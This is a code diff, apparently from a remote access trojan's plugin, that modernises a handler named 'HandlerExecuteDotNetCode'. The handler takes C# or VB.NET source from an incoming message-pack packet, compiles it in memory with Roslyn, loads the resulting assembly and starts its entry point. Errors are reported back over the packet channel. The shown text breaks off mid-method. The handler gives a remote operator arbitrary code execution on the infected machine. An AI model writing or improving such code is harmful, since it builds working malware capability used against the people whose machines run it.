@@ -1,75 +1,79 @@
-﻿using Microsoft.CSharp;
-using Microsoft.VisualBasic;
 using Plugin;
 using MessagePackLib.MessagePack;
 using System;
-using System.CodeDom.Compiler;
-using System.Collections.Generic;
-using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Reflection;
-using System.Text;
+using Microsoft.CodeAnalysis;
+using Microsoft.CodeAnalysis.CSharp;
+using Microsoft.CodeAnalysis.VisualBasic;
 
 namespace Miscellaneous.Handler
 {
     public class HandlerExecuteDotNetCode
     {
-        private Dictionary<string, string> providerOptions = new Dictionary<string, string>() {
-                {"CompilerVersion", "v4.0" }
-            };
-
         public HandlerExecuteDotNetCode(MsgPack unpack_msgpack)
         {
             switch (unpack_msgpack.ForcePathObject("Option").AsString)
             {
                 case "C#":
                     {
-                        Compiler(new CSharpCodeProvider(providerOptions), unpack_msgpack.ForcePathObject("Code").AsString, unpack_msgpack.ForcePathObject("Reference").AsString.Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
+                        CompileAndRun(isCSharp: true, unpack_msgpack.ForcePathObject("Code").AsString, unpack_msgpack.ForcePathObject("Reference").AsString.Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                         break;
                     }
 
                 case "VB.NET":
                     {
-                        Compiler(new VBCodeProvider(providerOptions), unpack_msgpack.ForcePathObject("Code").AsString, unpack_msgpack.ForcePathObject("Reference").AsString.Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
+                        CompileAndRun(isCSharp: false, unpack_msgpack.ForcePathObject("Code").AsString, unpack_msgpack.ForcePathObject("Reference").AsString.Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                         break;
                     }
             }
         }
 
-        public void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
+        private void CompileAndRun(bool isCSharp, string source, string[] referencedAssemblies)
         {
             try
             {
-                var providerOptions = new Dictionary<string, string>() {
-                {"CompilerVersion", "v4.0" }
-            };
+                var references = AppDomain.CurrentDomain.GetAssemblies()
+                    .Where(a => !a.IsDynamic && !string.IsNullOrEmpty(a.Location))
+                    .Select(a => MetadataReference.CreateFromFile(a.Location))
+                    .Cast<MetadataReference>()
+                    .ToList();
 
-                var compilerOptions = "/target:winexe /platform:anycpu /optimize-";
+                foreach (var r in referencedAssemblies.Where(r => !string.IsNullOrWhiteSpace(r) && File.Exists(r)))
+                    references.Add(MetadataReference.CreateFromFile(r));
 
-                var compilerParameters = new CompilerParameters(referencedAssemblies)
+                Compilation compilation;
+                if (isCSharp)
                 {
-                    GenerateExecutable = true,
-                    GenerateInMemory = true,
-                    CompilerOptions = compilerOptions,
-                    TreatWarningsAsErrors = false,
-                    IncludeDebugInformation = false,
-                };
-                var compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source);
-
-                if (compilerResults.Errors.Count > 0)
+                    var syntaxTree = CSharpSyntaxTree.ParseText(source);
+                    compilation = CSharpCompilation.Create("DynamicAssembly", new[] { syntaxTree }, references,
+                        new CSharpCompilationOptions(OutputKind.WindowsApplication));
+                }
+                else
                 {
-                    foreach (CompilerError compilerError in compilerResults.Errors)
+                    var syntaxTree = VisualBasicSyntaxTree.ParseText(source);
+                    compilation = VisualBasicCompilation.Create("DynamicAssembly", new[] { syntaxTree }, references,
+                        new VisualBasicCompilationOptions(OutputKind.WindowsApplication));
+                }
+
+                using var ms = new MemoryStream();
+                var result = compilation.Emit(ms);
+
+                if (!result.Success)
+                {
+                    var errors = result.Diagnostics.Where(d => d.Severity == DiagnosticSeverity.Error);
+                    foreach (var error in errors)
                     {
-                        Debug.WriteLine(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
-                            compilerError.Line, compilerError.Column, compilerError.FileName));
-                        Packet.Error(string.Format("{0}\nLine: {1}", compilerError.ErrorText,
-                            compilerError.Line));
+                        var lineSpan = error.Location.GetLineSpan();
+                        Packet.Error(string.Format("{0}\nLine: {1}", error.GetMessage(), lineSpan.StartLinePosition.Line + 1));
                         break;
                     }
                 }
                 else
                 {
-                    Assembly assembly = compilerResults.CompiledAssembly;
+                    ms.Seek(0, SeekOrigin.Begin);
+                    Assembly assembly = Assembly.Load(ms.ToArray());
                     MethodInfo methodInfo = assembly.EntryPoint;
                     object injObj = assembly.CreateInstance(methodInfo.Name);
                     object[] parameters = new object[1];
